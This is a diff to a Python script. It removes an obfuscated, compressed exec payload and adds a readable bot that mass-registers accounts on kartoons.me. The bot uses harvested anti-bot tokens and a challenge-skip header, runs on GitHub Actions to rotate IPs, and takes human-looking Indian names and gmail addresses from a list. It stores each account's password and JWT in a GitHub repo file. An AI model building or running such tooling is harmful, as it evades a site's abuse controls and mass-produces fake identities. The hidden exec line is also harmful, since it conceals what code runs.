@@ -1,2 +1,240 @@
-import zlib as _z, base64 as _b
-exec(compile(_z.decompress(_b.b64decode('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')), '<kts>', 'exec'))
+#!/usr/bin/env python3
+"""Runner auto-register v2 — GitHub Actions pe chalta hai (naya runner IP har run).
+AUTO MODE: inbox.txt se fresh token -> register (INDIAN DUMMY NAMES file se
+username+email — human-like, mailinator nahi) -> JWT -> runner_outbox.txt.
+v2 (2026-08-21): indian_dummy_gmail_ids_10000.txt se random name pick,
+used names outbox se skip (dobara use nahi), MAX_ACCOUNTS env se cap
+(pehle chhota batch — testing ke baad scale up).
+"""
+import json, os, random, string, time, urllib.request, urllib.error, base64, re
+
+TOKEN = os.environ.get("TOKEN", "")
+GH_PAT = os.environ.get("GH_PAT", "")
+GH_REPO = os.environ.get("GH_REPO", "")
+NAMES_URL = os.environ.get("NAMES_URL", "")  # raw gist/repo link to names file (optional)
+NAMES_FILE = os.environ.get("NAMES_FILE", "names.txt")  # local fallback
+MAX_ACCOUNTS = int(os.environ.get("MAX_ACCOUNTS", "3") or 3)  # cap per run (chhota pehle)
+UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36"
+HDRS = {"User-Agent": UA, "Content-Type": "application/json",
+        "Origin": "https://kartoons.me", "Referer": "https://kartoons.me/",
+        "X-Skip-Challenge": "true"}
+MAX_AGE = 240  # 4 min fresh limit
+
+# ============ INDIAN NAMES LOAD ============
+_NAMES = []
+
+
+def load_names():
+    """names file se (username, full_name) pairs. Pehle NAMES_URL, warna local file."""
+    global _NAMES
+    if _NAMES:
+        return _NAMES
+    content = ""
+    try:
+        if NAMES_URL:
+            rq = urllib.request.Request(NAMES_URL, headers={"User-Agent": "kts-runner"})
+            content = urllib.request.urlopen(rq, timeout=20).read().decode(errors="ignore")
+        elif os.path.exists(NAMES_FILE):
+            content = open(NAMES_FILE, encoding="utf-8", errors="ignore").read()
+    except Exception as e:
+        print("names load err:", str(e)[:80], flush=True)
+    for line in content.splitlines():
+        line = line.strip()
+        if not line or line.startswith("S.No.") or line.startswith("="):
+            continue
+        parts = [p.strip() for p in line.split("\t")]
+        if len(parts) >= 6:
+            uname = parts[4]
+            full = parts[1]
+        elif len(parts) == 1 and "@" in line:
+            # sirf email list format
+            uname = line.split("@")[0]
+            full = " ".join(w.capitalize() for w in uname.replace(".", " ").replace("_", " ").split()[:2]) or uname
+        else:
+            continue
+        if re.fullmatch(r"[a-zA-Z][a-zA-Z0-9._-]{2,}", uname):
+            _NAMES.append((uname, full))
+    return _NAMES
+
+
+def used_usernames():
+    """runner_outbox.txt se pehle use hue usernames (dobara na ho)."""
+    used = set()
+    try:
+        _, content = gh_get("runner_outbox.txt")
+        for m in re.finditer(r"username:\s*(\S+)", content):
+            used.add(m.group(1))
+    except Exception:
+        pass
+    return used
+
+
+def pick_name():
+    """Random fresh (username, full_name) — used wale skip."""
+    names = load_names()
+    if not names:
+        return None, None
+    used = used_usernames()
+    fresh = [n for n in names if n[0] not in used]
+    if not fresh:
+        print("SABHI names used — file khatam!", flush=True)
+        return None, None
+    return random.choice(fresh)
+
+
+def api_headers(extra=None):
+    h = {"Authorization": "token " + GH_PAT, "User-Agent": "kts-runner",
+         "Accept": "application/vnd.github+json"}
+    if extra: h.update(extra)
+    return h
+
+
+def gh_get(path):
+    rq = urllib.request.Request(f"https://api.github.com/repos/{GH_REPO}/contents/{path}",
+                                headers=api_headers())
+    try:
+        with urllib.request.urlopen(rq, timeout=20) as r:
+            d = json.loads(r.read().decode())
+            return d.get("sha"), base64.b64decode(d["content"]).decode(errors="ignore")
+    except urllib.error.HTTPError as e:
+        if e.code == 404:
+            return None, ""
+        raise
+
+
+def gh_put(path, content, sha=None):
+    data = {"message": f"update {path}", "content": base64.b64encode(content.encode()).decode()}
+    if sha: data["sha"] = sha
+    rq = urllib.request.Request(f"https://api.github.com/repos/{GH_REPO}/contents/{path}",
+                                data=json.dumps(data).encode(), method="PUT",
+                                headers=api_headers({"Content-Type": "application/json"}))
+    try:
+        with urllib.request.urlopen(rq, timeout=20) as r:
+            return r.status in (200, 201)
+    except urllib.error.HTTPError as e:
+        if e.code == 409:
+            return False  # conflict — race
+        raise
+
+
+def get_latest_fresh_token():
+    """inbox.txt se sabse naya fresh token (+ timestamp). Returns (epoch, token) ya None."""
+    sha, content = gh_get("inbox.txt")
+    now = time.time()
+    best = None
+    for line in content.splitlines():
+        line = line.strip()
+        if not line: continue
+        if ":" in line[:12]:
+            ep_s, tok = line.split(":", 1)
+            if ep_s.isdigit():
+                ep = int(ep_s)
+                if now - ep <= MAX_AGE:
+                    if best is None or ep > best[0]:
+                        best = (ep, tok)
+        else:
+            if best is None:
+                best = (int(now), line)
+    return best
+
+
+def remove_token_from_inbox(tok_to_remove):
+    try:
+        sha, content = gh_get("inbox.txt")
+        lines = [l for l in content.splitlines() if l.strip()]
+        keep = [l for l in lines if tok_to_remove not in l]
+        new_content = "\n".join(keep) + ("\n" if keep else "")
+        gh_put("inbox.txt", new_content, sha)
+    except Exception as e:
+        print("inbox cleanup fail:", str(e)[:60], flush=True)
+
+
+def req_register(token, uname, full_name):
+    password = "P@ss" + "".join(random.choices(string.ascii_letters + string.digits, k=14)) + "!"
+    email = f"{uname}@gmail.com"
+    body = json.dumps({"username": uname, "password": password,
+                       "email": email, "turnstile_token": token}).encode()
+    rq = urllib.request.Request("https://api.kartoons.me/api/auth/register",
+                                data=body, method="POST", headers=HDRS)
+    try:
+        with urllib.request.urlopen(rq, timeout=30) as resp:
+            d = json.loads(resp.read().decode())
+            dd = d.get("data") or {}
+            jwt = dd.get("access_token") or dd.get("token") or dd.get("jwt")
+            return {"ok": True, "username": uname, "full_name": full_name,
+                    "password": password, "email": email,
+                    "jwt": jwt or "", "status": resp.status}, None
+    except urllib.error.HTTPError as e:
+        return None, f"HTTP {e.code}: {e.read().decode()[:200]}"
+
+
+def update_status():
+    try:
+        sha, old = gh_get("runner_status.txt")
+        osha, ocontent = gh_get("runner_outbox.txt")
+        n = ocontent.count("username:")
+        text = f"last_run: {time.strftime('%Y-%m-%dT%H:%MZ', time.gmtime())}\ntotal_jwts: {n}"
+        gh_put("runner_status.txt", text, sha)
+    except Exception as e:
+        print("status update fail:", str(e)[:60], flush=True)
+
+
+def main():
+    print("runner IP:", urllib.request.urlopen("https://api.ipify.org", timeout=10).read().decode(), flush=True)
+    print("mode:", "manual" if TOKEN else "auto", "| max accounts:", MAX_ACCOUNTS, flush=True)
+    n_names = len(load_names())
+    print("names loaded:", n_names, flush=True)
+
+    if TOKEN:
+        tokens_to_try = [TOKEN]
+    else:
+        got = get_latest_fresh_token()
+        if not got:
+            print("NO FRESH TOKEN in inbox — nothing to do (tokens ruk gaye = runner stop)", flush=True)
+            return
+        tokens_to_try = []
+        for _ in range(MAX_ACCOUNTS):
+            g = get_latest_fresh_token()
+            if not g:
+                break
+            ep, tk = g
+            tokens_to_try.append(tk)
+            remove_token_from_inbox(tk)
+
+    made = 0
+    for i, tok in enumerate(tokens_to_try, 1):
+        if made >= MAX_ACCOUNTS:
+            print(f"cap {MAX_ACCOUNTS} reached — stop", flush=True)
+            break
+        uname, full = pick_name()
+        if not uname:
+            break
+        print(f"try {i}/{len(tokens_to_try)}: register as {uname}...", flush=True)
+        acc, err = req_register(tok, uname, full)
+        if err or not acc or not acc.get("jwt"):
+            print("  fail:", (err or "no jwt")[:120], flush=True)
+            continue
+        print(f"  ✅ {acc['username']} ({acc['full_name']})", flush=True)
+        rec = (f"\n===\nusername: {acc['username']}\nfull_name: {acc['full_name']}\n"
+               f"password: {acc['password']}\nemail: {acc['email']}\njwt: {acc['jwt']}\n"
+               f"source: github-runner\n")
+        for attempt in range(3):
+            try:
+                sha, old = gh_get("runner_outbox.txt")
+                if gh_put("runner_outbox.txt", (old + rec).strip() + "\n", sha):
+                    break
+            except Exception:
+                pass
+            time.sleep(2)
+        made += 1
+        update_status()
+        time.sleep(12)  # BATCH gap — ek runner IP se 2 accounts 12s gap
+
+    if made:
+        print(f"DONE: {made} JWT banaye is run me", flush=True)
+    else:
+        print("No account bana — tokens expire ho gaye honge. Naye bhejo.", flush=True)
+
+
+if __name__ == "__main__":
+    main()
